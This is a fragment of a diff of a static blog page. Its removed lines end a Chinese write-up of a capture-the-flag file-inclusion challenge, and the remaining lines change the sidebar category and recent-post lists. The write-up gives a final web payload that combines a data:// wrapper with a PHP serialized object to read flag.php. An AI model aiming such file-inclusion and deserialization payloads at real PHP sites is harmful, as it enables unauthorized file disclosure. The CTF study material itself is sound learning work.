-<p><img src="https://img-blog.csdnimg.cn/20200421152420825.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjIyNDQy,size_16,color_FFFFFF,t_70" alt="img"></p>
-<p>反序列化后就是password要传入的值了</p>
-<p><img src="file:///C:/Users/admin/AppData/Roaming/Typora/typora-user-images/image-20220826223458883.png" alt="image-20220826223458883"></p>
-<p>最终构造payload：/?text=data:text/plain,welcome to the zjctf&amp;file=useless.php&amp;password=O:4:”Flag”:1:{s:4:”file”;s:8:”flag.php”;}</p>
-<p>然后f12得到flag</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2022/08/26/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB1/" data-id="cl7xiuasj000w98dq0m6o3irq" class="article-share-link">Share</a>
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-  
 
 
   <nav id="page-nav">
@@ -771,7 +853,7 @@
   <div class="widget-wrap">
     <h3 class="widget-title">Categories</h3>
     <div class="widget">
-      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/http/">http</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/js/">js</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/python/">python</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/unserialize/">unserialize</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/xxe/">xxe</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/">文件包含</a></li></ul>
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/http/">http</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/js/">js</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/python/">python</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/unserialize/">unserialize</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/xxe/">xxe</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/">命令执行</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/">文件包含</a></li></ul>
     </div>
   </div>
 
@@ -799,6 +881,14 @@
       <ul>
         
           <li>
+            <a href="/2022/09/15/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%BB%83%E4%B9%A0/">命令执行练习</a>
+          </li>
+        
+          <li>
+            <a href="/2022/09/13/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%BB%95%E8%BF%87%E6%80%BB%E7%BB%93/">文件包含绕过总结</a>
+          </li>
+        
+          <li>
             <a href="/2022/09/09/python%E7%88%AC%E8%99%AB%E5%AD%A6%E4%B9%A0/">python爬虫学习</a>
           </li>
         
@@ -808,14 +898,6 @@
         
           <li>
             <a href="/2022/09/04/xxe%E6%BC%8F%E6%B4%9E2/">xxe漏洞2</a>
-          </li>
-        
-          <li>
-            <a href="/2022/09/04/js%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%80%EF%BC%89/">js学习笔记（一）</a>
-          </li>
-        
-          <li>
-            <a href="/2022/09/03/xxe%E8%A7%A3%E9%A2%98%E5%90%88%E9%9B%86/">xxe解题合集</a>
           </li>
         
       </ul>
